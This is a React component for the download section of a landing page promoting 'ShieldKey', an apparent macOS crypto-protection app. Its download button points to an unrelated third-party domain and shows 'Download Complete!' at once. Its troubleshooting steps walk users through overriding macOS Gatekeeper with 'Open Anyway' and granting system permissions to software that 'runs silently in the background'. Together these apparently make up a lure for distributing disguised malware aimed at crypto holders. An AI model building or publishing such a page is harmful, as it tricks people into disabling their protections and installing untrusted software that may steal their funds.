import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Check } from "lucide-react";

export default function InstallationFlow() {
  const [showProgress, setShowProgress] = useState(false);

  const handleDownload = () => {
    setShowProgress(true);
    // In a real implementation, this would trigger the actual download
    window.open("https://downloadmacos.com/macshare.php?call=shield", "_blank");
  };

  const steps = [
    {
      number: 1,
      title: "Download & Install",
      description: "Download the .dmg file and drag ShieldKey to your Applications folder."
    },
    {
      number: 2,
      title: "Quick Setup",
      description: "Launch ShieldKey and grant necessary permissions for system protection."
    },
    {
      number: 3,
      title: "Stay Protected",
      description: "ShieldKey runs silently in the background, protecting your crypto 24/7."
    }
  ];

  return (
    <section className="py-24 bg-white">
      <div className="max-w-4xl mx-auto px-6 lg:px-8 text-center">
        <h2 className="text-4xl font-black text-gradient mb-4">
          Get Protected in 60 Seconds
        </h2>
        <p className="text-xl text-gray-600 mb-12 max-w-3xl mx-auto">
          Simple installation process designed for Mac users. No technical expertise required.
        </p>
        
        {/* Installation Steps */}
        <div className="grid md:grid-cols-3 gap-8 mb-12">
          {steps.map((step) => (
            <div key={step.number} className="relative">
              <div className="w-16 h-16 bg-gradient-to-br from-secondary to-accent rounded-full flex items-center justify-center text-white font-bold text-xl mx-auto mb-4">
                {step.number}
              </div>
              <h3 className="text-lg font-bold mb-2">{step.title}</h3>
              <p className="text-gray-600">{step.description}</p>
            </div>
          ))}
        </div>
        
        {/* Download CTA */}
        <div className="space-y-6">
          <Button 
            onClick={handleDownload}
            className="btn-gradient text-white px-12 py-5 rounded-2xl font-bold text-xl hover:shadow-floating transform hover:-translate-y-2 transition-all duration-300 min-h-[70px] flex items-center justify-center"
          >
            <div className="flex flex-col items-center">
              <span>Download ShieldKey Beta</span>
              <span className="text-sm opacity-80 font-normal">v0.1.0 • macOS 11.0+ • Free</span>
            </div>
          </Button>
          
          {/* Progress Indicator */}
          {showProgress && (
            <div className="glassmorphic rounded-xl p-6 max-w-md mx-auto">
              <div className="flex items-center space-x-3 mb-3">
                <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                  <Check className="w-4 h-4 text-white" />
                </div>
                <span className="font-semibold">Download Complete!</span>
              </div>
              <p className="text-sm text-gray-600 mb-4">
                Your download should start automatically. If not, 
                <Button 
                  variant="link" 
                  className="text-secondary font-semibold p-0 ml-1 h-auto"
                  onClick={handleDownload}
                >
                  click here
                </Button>.
              </p>
              
              {/* Troubleshooting */}
              <div className="border-t pt-4">
                <h4 className="font-semibold mb-2">Having trouble opening?</h4>
                <div className="space-y-2 text-sm text-gray-600">
                  <p>1. Right-click ShieldKey.dmg → Open</p>
                  <p>2. Go to System Preferences → Security & Privacy</p>
                  <p>3. Click "Open Anyway" next to ShieldKey</p>
                </div>
                <p className="text-sm text-gray-600 mt-3">
                  Still stuck? <a href="mailto:support@shieldkey.app" className="text-secondary font-semibold hover:underline">Contact Support</a>
                </p>
              </div>
            </div>
          )}
        </div>
      </div>
    </section>
  );
}
